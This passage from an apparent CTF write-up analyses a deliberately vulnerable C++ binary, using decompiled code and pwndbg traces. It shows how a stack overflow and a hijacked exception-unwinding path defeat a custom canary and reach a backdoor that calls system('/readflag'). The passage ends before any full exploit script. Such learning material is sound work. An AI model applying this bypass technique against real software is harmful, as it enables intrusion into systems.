</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">UnsafeApp</span> {
</span></span><span style="display:flex;"><span>  UnsafeApp() { puts(<span style="color:#e6db74">&#34;creating dangerous app...&#34;</span>); }
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#f92672">~</span>UnsafeApp() {}
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">virtual</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">BOFApp</span> <span style="color:#f92672">:</span> UnsafeApp {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">launch</span>() <span style="color:#66d9ef">override</span> {
</span></span><span style="display:flex;"><span>    ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span> buf;
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>    buf.mut([](<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p) { scanf(<span style="color:#e6db74">&#34;%[^</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">]&#34;</span>, p); });
</span></span><span style="display:flex;"><span>    puts(buf.buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">backdoor</span>() { system(<span style="color:#e6db74">&#34;/readflag&#34;</span>); }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdout, <span style="color:#66d9ef">nullptr</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><code>utils.h</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#75715e">#pragma once
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdlib&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdexcept&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> u64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span> <span style="color:#66d9ef">long</span>;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">raise</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>msg) {
</span></span><span style="display:flex;"><span>  puts(msg);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">throw</span> std<span style="color:#f92672">::</span>runtime_error(msg);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">readall</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>ptr, size_t size) {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>p <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)ptr;
</span></span><span style="display:flex;"><span>  size_t tot <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> (tot <span style="color:#f92672">&lt;</span> size) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> res <span style="color:#f92672">=</span> read(STDIN_FILENO, p <span style="color:#f92672">+</span> tot, size <span style="color:#f92672">-</span> tot);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (res <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>      raise(<span style="color:#e6db74">&#34;IO error&#34;</span>);
</span></span><span style="display:flex;"><span>    tot <span style="color:#f92672">+=</span> res;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">template</span> <span style="color:#f92672">&lt;</span><span style="color:#66d9ef">typename</span> T<span style="color:#f92672">&gt;</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">inline</span> <span style="color:#66d9ef">void</span> readall(T <span style="color:#f92672">&amp;</span>dest) {
</span></span><span style="display:flex;"><span>  readall(<span style="color:#f92672">&amp;</span>dest, <span style="color:#66d9ef">sizeof</span>(dest));
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The author of the challenge has implemented a custom canary, as the title suggests.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">init_canary</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">sizeof</span>(sys_canary) <span style="color:#f92672">!=</span> getrandom(sys_canary, <span style="color:#66d9ef">sizeof</span>(sys_canary), <span style="color:#ae81ff">0</span>)) {
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;canary init error&#34;</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;To increase entropy, give me your canary&#34;</span>);
</span></span><span style="display:flex;"><span>  readall(user_canary);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>In main function, an object was actually instantiated and other subsequent functions were called.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v3; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v5[<span style="color:#ae81ff">8</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v6; <span style="color:#75715e">// [rsp+8h] [rbp-18h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v6 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  setbuf(stdin, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  setbuf(_bss_start, <span style="color:#ae81ff">0LL</span>);
</span></span><span style="display:flex;"><span>  init_canary();
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span><span style="color:#f92672">-&gt;</span>(v5);
</span></span><span style="display:flex;"><span>  (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">void</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)v3 <span style="color:#f92672">+</span> <span style="color:#ae81ff">16LL</span>))(v3);
</span></span><span style="display:flex;"><span>  std<span style="color:#f92672">::</span>unique_ptr<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::~</span>unique_ptr(v5);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I have located the destructor for this object, which will invoke the function pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> std<span style="color:#f92672">::</span>default_delete<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;::</span><span style="color:#66d9ef">operator</span>()(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> result; <span style="color:#75715e">// rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> a2;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( a2 )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (<span style="color:#f92672">*</span>(<span style="color:#66d9ef">__int64</span> (<span style="color:#66d9ef">__fastcall</span> <span style="color:#f92672">**</span>)(<span style="color:#66d9ef">__int64</span>))(<span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)a2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8LL</span>))(a2);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The main function will invoke the <code>BOFApp::launch</code> function.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> BOFApp<span style="color:#f92672">::</span>launch(BOFApp <span style="color:#f92672">*</span><span style="color:#66d9ef">this</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> v2; <span style="color:#75715e">// [rsp+1Fh] [rbp-61h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">88</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-60h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> v4; <span style="color:#75715e">// [rsp+78h] [rbp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>ProtectedBuffer(s);
</span></span><span style="display:flex;"><span>  puts(<span style="color:#e6db74">&#34;input something to pwn :)&#34;</span>);
</span></span><span style="display:flex;"><span>  ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(s, <span style="color:#f92672">&amp;</span>v2);
</span></span><span style="display:flex;"><span>  puts(s);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v4 <span style="color:#f92672">-</span> __readfsqword(<span style="color:#ae81ff">0x28u</span>);
</span></span></code></pre></div><p>It&rsquo;s look safe, we continue in mut function, it take a function as a argument</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span>_int64 <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>mut<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">&gt;</span>(<span style="color:#66d9ef">__int64</span> a1, <span style="color:#66d9ef">__int64</span> a2)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  BOFApp<span style="color:#f92672">::</span>launch(<span style="color:#66d9ef">void</span>)<span style="color:#f92672">::</span>{lambda(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#960050;background-color:#1e0010">#</span><span style="color:#ae81ff">1</span>}<span style="color:#f92672">::</span><span style="color:#66d9ef">operator</span>()(a2, a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(a1);
</span></span><span style="display:flex;"><span>}    
</span></span></code></pre></div><h2 id="vulnerability">Vulnerability</h2>
<p>Through debugging, we can see that there is a stack overflow vulnerability in the function that was called because it calls to <code>scanf(&quot;%[^\n]&quot;, p)</code> and doesn&rsquo;t check the boundary</p>
<p>But it isn&rsquo;t easy to use a normal BOF attack, because it calls the function  <code>ProtectedBuffer&lt;64ul&gt;:: check(a1)</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">__fastcall</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>check(<span style="color:#66d9ef">__int64</span> a1)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">__int64</span> v1; <span style="color:#75715e">// rbx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">bool</span> result; <span style="color:#75715e">// al
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">72</span>);
</span></span><span style="display:flex;"><span>  result <span style="color:#f92672">=</span> v1 <span style="color:#f92672">!=</span> ProtectedBuffer<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">64ul</span><span style="color:#f92672">&gt;::</span>getCanary(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( result )
</span></span><span style="display:flex;"><span>    raise(<span style="color:#e6db74">&#34;*** stack smash detected ***&#34;</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> result;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>If we cannot bypass this, it will trigger a stack smash error. We&rsquo;ll address it later.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">backdoor</span>(<span style="color:#66d9ef">void</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> system(<span style="color:#e6db74">&#34;/readflag&#34;</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>I see a <code>backdoor</code> function. How can we call it without bypassing the canary?</p>
<h2 id="c-exception-handling">C++ exception handling</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cpp" data-lang="cpp"><span style="display:flex;"><span><span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">auto</span> app <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>make_unique<span style="color:#f92672">&lt;</span>BOFApp<span style="color:#f92672">&gt;</span>();
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">-&gt;</span>launch();
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">catch</span> (...) {
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;error!!!&#34;</span>);
</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>When the check fails, the program will print <code>*** stack smash detected ***</code> using the <code>raise()</code> function. In this case, the program will look for a catch statement to handle the exception and prevent the program from crashing.</p>
<pre tabindex="0"><code>──────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────
   0x4018f2 &lt;ProtectedBuffer&lt;64ul&gt;::check()+40&gt;    setne  al
   0x4018f5 &lt;ProtectedBuffer&lt;64ul&gt;::check()+43&gt;    test   al, al
   0x4018f7 &lt;ProtectedBuffer&lt;64ul&gt;::check()+45&gt;    je     ProtectedBuffer&lt;64ul&gt;::check()+62                      &lt;ProtectedBuffer&lt;64ul&gt;::check()+62&gt;
 
   0x4018f9 &lt;ProtectedBuffer&lt;64ul&gt;::check()+47&gt;    lea    rax, [rip + 0x7be]
   0x401900 &lt;ProtectedBuffer&lt;64ul&gt;::check()+54&gt;    mov    rdi, rax
 ► 0x401903 &lt;ProtectedBuffer&lt;64ul&gt;::check()+57&gt;    call   raise(char const*)                      &lt;raise(char const*)&gt;
        rdi: 0x4020be ◂— &#39;*** stack smash detected ***&#39;
        rsi: 0xa
        rdx: 0x0
        rcx: 0x20
 
   0x401908 &lt;ProtectedBuffer&lt;64ul&gt;::check()+62&gt;    nop    
   0x401909 &lt;ProtectedBuffer&lt;64ul&gt;::check()+63&gt;    mov    rbx, qword ptr [rbp - 8]
   0x40190d &lt;ProtectedBuffer&lt;64ul&gt;::check()+67&gt;    leave  
   0x40190e &lt;ProtectedBuffer&lt;64ul&gt;::check()+68&gt;    ret    
 
   0x40190f                                        nop    
────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7ffdf367cad0 ◂— 9 /* &#39;\t&#39; */
01:0008│     0x7ffdf367cad8 —▸ 0x7ffdf367cb40 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
02:0010│     0x7ffdf367cae0 —▸ 0x7ffdf367cb40 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
03:0018│     0x7ffdf367cae8 —▸ 0x7ffdf367cce8 —▸ 0x7ffdf367e21e ◂— 0x74756f2e612f2e /* &#39;./a.out&#39; */
04:0020│ rbp 0x7ffdf367caf0 —▸ 0x7ffdf367cb10 —▸ 0x7ffdf367cba0 ◂— 0x0
05:0028│     0x7ffdf367caf8 —▸ 0x401739 (void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51) ◂— nop 
06:0030│     0x7ffdf367cb00 —▸ 0x7ffdf367cb3f ◂— 0x4141414141414100
07:0038│     0x7ffdf367cb08 —▸ 0x7ffdf367cb40 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x401903 ProtectedBuffer&lt;64ul&gt;::check()+57
   1         0x401739 void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51
   2         0x40169d BOFApp::launch()+77
   3         0x403407
   4         0x4f4ab0
   5         0x4f4ab0
   6          0x12000
   7   0x7ffdf367cce8
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg&gt;   
</code></pre><h2 id="stack-unwinding">Stack unwinding</h2>
<p>If it is not found in this function, it will be searched up along the function call chain, and there will be two results:</p>
<ul>
<li>Find the catch, record the catch location, clean the stack starting from the function that throws the exception, until you reach the function where the catch is located, and enter the catch code for processing</li>
<li>If the corresponding catch is not found after walking through the call chain, then call <code>std::terminate()</code>, this function to abort the program by default.</li>
</ul>
<p>If you are curious about that, please feel free to read the <a href="https://baiy.cn/doc/cpp/inside_exception.htm">article</a>.</p>
<p>The next functions called in sequence are: <code>raise-&gt;__cxa_throw-&gt;_Unwind_RaiseException</code>.</p>
<pre tabindex="0"><code> ► 0x404056 &lt;__cxa_throw+54&gt;    call   _Unwind_RaiseException                      &lt;_Unwind_RaiseException&gt;
        rdi: 0x12c13b0 ◂— 0x474e5543432b2b00
        rsi: 0x4e76f0 (typeinfo for std::runtime_error) —▸ 0x4e75e0 (vtable for __cxxabiv1::__si_class_type_info+16) —▸ 0x404120 (__cxxabiv1::__si_class_type_info::~__si_class_type_info()) ◂— endbr64 
        rdx: 0x404740 (std::runtime_error::~runtime_error()) ◂— endbr64 
        rcx: 0x12c1408 ◂— &#39;*** stack smash detected ***&#39;
</code></pre><p>The function <code>_Unwind_RaiseException()</code> takes the address of each frame below to locate the corresponding catch. If it fails to find one, the function calls <code>std::terminate()</code> to abort and exit the program.</p>
<pre tabindex="0"><code>──────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x404056 __cxa_throw+54
   1         0x402178 raise(char const*)+83
   2         0x4026b2 ProtectedBuffer&lt;64ul&gt;::check()+62
   3         0x4024e3 void ProtectedBuffer&lt;64ul&gt;::mut&lt;BOFApp::launch()::{lambda(char*)#1}&gt;(BOFApp::launch()::{lambda(char*)#1} const&amp;)+51
   4         0x40245a BOFApp::launch()+62
   5       0xdeadbeef
   6       0xdeadbeef
   7       0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
</code></pre><p>So, if we want to continue the flow execution in main, we much provide exactly where the address of the catch block is, so we can continue to exploit it that don&rsquo;t terminate program.</p>
<p>I have found out the address <code>0x4022de</code> that make the program continue execution because it is where the catch block lie.</p>
<pre tabindex="0"><code>  0x41acdd &lt;_Unwind_RaiseException+909&gt;    mov    r14, qword ptr [rbp - 0x10]
   0x41ace1 &lt;_Unwind_RaiseException+913&gt;    mov    r15, qword ptr [rbp - 8]
   0x41ace5 &lt;_Unwind_RaiseException+917&gt;    mov    rbp, qword ptr [rbp]
   0x41ace9 &lt;_Unwind_RaiseException+921&gt;    mov    rsp, rcx
   0x41acec &lt;_Unwind_RaiseException+924&gt;    pop    rcx
 ► 0x41aced &lt;_Unwind_RaiseException+925&gt;    jmp    rcx                           &lt;main+116&gt;
    ↓
   0x4022f1 &lt;main+116&gt;                      endbr64 
   0x4022f5 &lt;main+120&gt;                      mov    rbx, rax
   0x4022f8 &lt;main+123&gt;                      lea    rax, [rbp - 0x18]
   0x4022fc &lt;main+127&gt;                      mov    rdi, rax
   0x4022ff &lt;main+130&gt;                      call   std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()                      &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()&gt;
</code></pre><p>We successfully changed its flow!  it will call to <code>exit()</code> to terminate the program without return.  How can we execute the <code>backdoor()</code> function?</p>
<p>Afterwards, the program will proceed to execute the destructor method of this particular object. Let&rsquo;s delve deeper into this process:</p>
<pre tabindex="0"><code>0x4022f1 &lt;main+116&gt;                      endbr64 
   0x4022f5 &lt;main+120&gt;                      mov    rbx, rax
   0x4022f8 &lt;main+123&gt;                      lea    rax, [rbp - 0x18]
   0x4022fc &lt;main+127&gt;                      mov    rdi, rax
 ► 0x4022ff &lt;main+130&gt;                      call   std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()                      &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()&gt;
        rdi: 0x7ffe1006ece8 —▸ 0x7ffe1006ed40 ◂— &#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;
        rsi: 0x4022f1 (main+116) ◂— endbr64 
        rdx: 0x1
        rcx: 0x4022f1 (main+116) ◂— endbr64     
</code></pre><h2 id="arbitrary-execution">Arbitrary Execution</h2>
<p>We go through and see this will cause SIGSEV when <code>rdx</code> doesn&rsquo;t point to a valid address,</p>
<pre tabindex="0"><code>   0x4027d7 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+29&gt;    mov    rdx, qword ptr [rax]
   0x4027da &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+32&gt;    add    rdx, 8
 ► 0x4027de &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+36&gt;    mov    rdx, qword ptr [rdx]
   0x4027e1 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+39&gt;    mov    rdi, rax
   0x4027e4 &lt;std::default_delete&lt;BOFApp&gt;::operator()(BOFApp*) const+42&gt;    call   rdx
</code></pre><p>As long as you control the rax register, you can control the rdx register, which results in arbitrary execution.</p>
<p>This function takes out the data from the stack combined with the stack overflow above we can control the rax register.</p>
<pre tabindex="0"><code> 0x4025c9 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+57&gt;    mov    rbx, rax
   0x4025cc &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+60&gt;    mov    rax, qword ptr [rbp - 0x18]
   0x4025d0 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+64&gt;    mov    rdi, rax
 ► 0x4025d3 &lt;std::unique_ptr&lt;BOFApp, std::default_delete&lt;BOFApp&gt; &gt;::~unique_ptr()+67&gt;    call   std::remove_reference&lt;BOFApp*&amp;&gt;::type&amp;&amp; std::move&lt;BOFApp*&amp;&gt;(BOFApp*&amp;)                      &lt;std::remove_reference&lt;BOFApp*&amp;&gt;::type&amp;&amp; std::move&lt;BOFApp*&amp;&gt;(BOFApp*&amp;)&gt;
        rdi: 0x4022c6 (main+73) ◂— call 0xffffffffe907ac13
        rsi: 0x4022f1 (main+116) ◂— endbr64 
